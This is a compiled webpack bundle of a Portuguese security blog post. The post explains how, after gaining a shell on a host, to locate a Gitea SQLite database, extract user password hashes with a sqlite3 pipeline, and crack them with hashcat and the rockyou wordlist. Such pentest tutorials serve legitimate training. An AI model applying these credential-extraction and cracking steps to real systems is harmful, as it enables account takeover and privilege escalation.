"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[297],{3469:(e,a,s)=>{s.r(a),s.d(a,{assets:()=>d,contentTitle:()=>r,default:()=>h,frontMatter:()=>t,metadata:()=>o,toc:()=>l});var o=s(7629),i=s(4848),n=s(8453);const t={title:"Extraindo Usu\xe1rios do Gitea",description:"Como extrair usu\xe1rios do Gitea DB e como quebr\xe1-los via brute force.",slug:"gitea_users_exfiltration",authors:"raphaelsander",tags:["gitea","sqlite","hash","hashcat","privilege_escalation"],hide_table_of_contents:!1},r=void 0,d={authorsImageUrls:[void 0]},l=[{value:"Localizando o Gitea DB",id:"localizando-o-gitea-db",level:2},{value:"Extraindo o Hash do Usu\xe1rios",id:"extraindo-o-hash-do-usu\xe1rios",level:2},{value:"Quebra do Hash",id:"quebra-do-hash",level:2},{value:"Refer\xeancias",id:"refer\xeancias",level:2}];function c(e){const a={a:"a",br:"br",code:"code",em:"em",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,n.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsxs)(a.p,{children:["Quando ganhamos acesso a um ",(0,i.jsx)(a.em,{children:"host"})," por\xe9m precisamos escalar privil\xe9gios e\nconseguir acesso \xe0 autentica\xe7\xe3o de usu\xe1rio com permiss\xf5es mais elevadas pode ser\num desafio. Nesse ",(0,i.jsx)(a.em,{children:"post"})," irei mostrar como fazer a extra\xe7\xe3o e quebra dos\nusu\xe1rios presentes no DB da aplica\xe7\xe3o Gitea, mas que pode n\xe3o se limitar apenas\na este."]}),"\n","\n",(0,i.jsx)(a.h2,{id:"localizando-o-gitea-db",children:"Localizando o Gitea DB"}),"\n",(0,i.jsx)(a.p,{children:"A localiza\xe7\xe3o do banco de dados do Gitea em caso de ser Sqlite3, \xe9 definido no\nsetup inicial ou via vari\xe1vel de ambiente caso conteinerizado."}),"\n",(0,i.jsx)(a.p,{children:(0,i.jsx)(a.img,{alt:"gitea_db_setup",src:s(9683).A+"",width:"702",height:"230"})}),"\n",(0,i.jsxs)(a.p,{children:["Este \xe9 apenas um cen\xe1rio caso voc\xea tenha acesso a uma ",(0,i.jsx)(a.em,{children:"shell"})," ou uma falha de\nRCE no ",(0,i.jsx)(a.em,{children:"host"})," alvo, caso contr\xe1rio ser\xe1 necess\xe1rio identificar a localiza\xe7\xe3o do\narquivo e download de outra maneira."]}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-bash",children:"find / -name gitea.db 2>/dev/null\n# ou\nfind / -name *.db 2>/dev/null\n"})}),"\n",(0,i.jsx)(a.h2,{id:"extraindo-o-hash-do-usu\xe1rios",children:"Extraindo o Hash do Usu\xe1rios"}),"\n",(0,i.jsxs)(a.p,{children:["Abaixo iremos extrair o usu\xe1rio da tabela ",(0,i.jsx)(a.code,{children:"user"})," e formatar para que o ",(0,i.jsx)(a.em,{children:"salt"})," e\no ",(0,i.jsx)(a.em,{children:"hash"})," fiquem no formato reconhecido pelo Hashcat."]}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-bash",children:'sqlite3 gitea.db "select passwd,salt,name from user" | \\\n    while read data; do\n        digest=$(echo "$data" | cut -d\'|\' -f1 | xxd -r -p | base64);\n        salt=$(echo "$data" | cut -d\'|\' -f2 | xxd -r -p | base64);\n        name=$(echo $data | cut -d\'|\' -f3);\n        echo "${name}:sha256:50000:${salt}:${digest}";\n    done | \\\n    tee gitea.hashes\n'})}),"\n",(0,i.jsx)(a.p,{children:"Resultado:"}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-hash",children:"# <user>:<algoritm>:<interaction_number>:<salt>:<digest>\nadmin:sha256:50000:dgaKi9oBOPF7HkA4p4/dmQ==:sPxfp5JlXb0HURMg3Xwv9UmEQkYtRn+VZAbakCuPHwZRJfACimU+2t4yQVEoWo3wuss=\n"})}),"\n",(0,i.jsxs)(a.p,{children:[(0,i.jsx)(a.code,{children:"<user>"}),": Indica o nome ou identificador do usu\xe1rio.",(0,i.jsx)(a.br,{}),"\n",(0,i.jsx)(a.code,{children:"<algoritm>"}),": Especifica o algoritmo de hash utilizado para transformar a senha\nem uma sequ\xeancia fixa (neste caso, SHA-256).",(0,i.jsx)(a.br,{}),"\n",(0,i.jsx)(a.code,{children:"<50000>"}),": Representa o n\xfamero de itera\xe7\xf5es que o algoritmo de hash \xe9 aplicado.\nEssa repeti\xe7\xe3o torna o processo de c\xe1lculo mais lento, ajudando a dificultar\nataques de for\xe7a bruta.",(0,i.jsx)(a.br,{}),"\n",(0,i.jsx)(a.code,{children:"<salt>"}),": \xc9 um valor aleat\xf3rio adicionado \xe0 senha antes de aplicar o hash. O\nsalt previne o uso de tabelas pr\xe9-calculadas (rainbow tables) e garante que\nsenhas iguais n\xe3o resultem no mesmo hash.",(0,i.jsx)(a.br,{}),"\n",(0,i.jsx)(a.code,{children:"<digest>"}),": \xc9 o resultado final (o hash) da senha combinada com o salt,\nprocessada pelo algoritmo SHA-256 o n\xfamero especificado de vezes."]}),"\n",(0,i.jsxs)(a.p,{children:["Note que o salt e o digest precisam estar em ",(0,i.jsx)(a.em,{children:"base64"})," porque para esse ",(0,i.jsx)(a.em,{children:"hash"})," \xe9\nsolicitado pelo Hashcat. Podemos ver isso com o argumento ",(0,i.jsx)(a.code,{children:"--hash-info"}),":"]}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-bash",children:"hashcat -m 10900 --hash-info\n"})}),"\n",(0,i.jsx)(a.p,{children:(0,i.jsx)(a.img,{alt:"hash_info",src:s(8323).A+"",width:"723",height:"520"})}),"\n",(0,i.jsxs)(a.p,{children:["O n\xfamero de itera\xe7\xf5es pode ser diferente dependendo do ",(0,i.jsx)(a.code,{children:"PASSWORD_HASH_ALGO"}),"\nutilizado durante o setup ou como vari\xe1vel de ambiente. Abaixo temos as op\xe7\xf5es\nde ",(0,i.jsx)(a.code,{children:"PASSWORD_HASH_ALGO"}),", note que no caso do ",(0,i.jsx)(a.code,{children:"pbkdf2"}),", h\xe1 v\xe1rias itera\xe7\xf5es\nposs\xedveis (10000, 50000 e 320000)."]}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-hash",children:"argon2: argon2$2$65536$8$50\nbcrypt: bcrypt$10\npbkdf2: pbkdf2$50000$50\npbkdf2_v1: pbkdf2$10000$50\npbkdf2_v2: pbkdf2$50000$50\npbkdf2_hi: pbkdf2$320000$50\nscrypt: scrypt$65536$16$2$50\n"})}),"\n",(0,i.jsx)(a.p,{children:"Isso vai estar dispon\xedvel no pr\xf3prio banco de dados:"}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-bash",children:'$ sqlite3 gitea.db "select passwd_hash_algo from user"\npbkdf2$50000$50\n'})}),"\n",(0,i.jsx)(a.h2,{id:"quebra-do-hash",children:"Quebra do Hash"}),"\n",(0,i.jsx)(a.p,{children:"Para a quebra dos hashes utilizando o hashcat \xe9 bem simples e inclusive pode ser\nomitido o argumento que indica do algor\xedtmo porque ser\xe1 automaticamente\ndefinido."}),"\n",(0,i.jsx)(a.pre,{children:(0,i.jsx)(a.code,{className:"language-bash",children:"hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user\n"})}),"\n",(0,i.jsx)(a.h2,{id:"refer\xeancias",children:"Refer\xeancias"}),"\n",(0,i.jsxs)(a.ul,{children:["\n",(0,i.jsx)(a.li,{children:(0,i.jsx)(a.a,{href:"https://hashcat.net/wiki/doku.php?id=example_hashes",children:"https://hashcat.net/wiki/doku.php?id=example_hashes"})}),"\n",(0,i.jsx)(a.li,{children:(0,i.jsx)(a.a,{href:"https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash",children:"https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash"})}),"\n",(0,i.jsx)(a.li,{children:(0,i.jsx)(a.a,{href:"https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#cracking-gitea-hashes",children:"https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#cracking-gitea-hashes"})}),"\n",(0,i.jsx)(a.li,{children:(0,i.jsx)(a.a,{href:"https://medium.com/@khaledkamal456/solving-htb-machine-titanic-easy-3fbf13560594",children:"https://medium.com/@khaledkamal456/solving-htb-machine-titanic-easy-3fbf13560594"})}),"\n"]})]})}function h(e={}){const{wrapper:a}={...(0,n.R)(),...e.components};return a?(0,i.jsx)(a,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},7629:e=>{e.exports=JSON.parse('{"permalink":"/my-docs/blog/gitea_users_exfiltration","source":"@site/blog/gitea_users_exfiltration.mdx","title":"Extraindo Usu\xe1rios do Gitea","description":"Como extrair usu\xe1rios do Gitea DB e como quebr\xe1-los via brute force.","date":"2025-08-06T14:56:14.000Z","tags":[{"inline":true,"label":"gitea","permalink":"/my-docs/blog/tags/gitea"},{"inline":true,"label":"sqlite","permalink":"/my-docs/blog/tags/sqlite"},{"inline":true,"label":"hash","permalink":"/my-docs/blog/tags/hash"},{"inline":true,"label":"hashcat","permalink":"/my-docs/blog/tags/hashcat"},{"inline":true,"label":"privilege_escalation","permalink":"/my-docs/blog/tags/privilege-escalation"}],"readingTime":2.495,"hasTruncateMarker":true,"authors":[{"name":"Raphael Sander","title":"Senior DevSecOps","url":"https://github.com/raphaelsander","socials":{"github":"https://github.com/raphaelsander"},"imageURL":"https://github.com/raphaelsander.png","key":"raphaelsander","page":null}],"frontMatter":{"title":"Extraindo Usu\xe1rios do Gitea","description":"Como extrair usu\xe1rios do Gitea DB e como quebr\xe1-los via brute force.","slug":"gitea_users_exfiltration","authors":"raphaelsander","tags":["gitea","sqlite","hash","hashcat","privilege_escalation"],"hide_table_of_contents":false},"unlisted":false,"nextItem":{"title":"GPU CUDA no WSL","permalink":"/my-docs/blog/gpu_cuda_in_wsl"}}')},8323:(e,a,s)=>{s.d(a,{A:()=>o});const o=s.p+"assets/images/hash_info-fd58877a9df3dda8adc87b179675882c.png"},8453:(e,a,s)=>{s.d(a,{R:()=>t,x:()=>r});var o=s(6540);const i={},n=o.createContext(i);function t(e){const a=o.useContext(n);return o.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function r(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),o.createElement(n.Provider,{value:a},e.children)}},9683:(e,a,s)=>{s.d(a,{A:()=>o});const o=s.p+"assets/images/gitea_db_setup-075e0566f3ef292044299c66e35a4c72.png"}}]);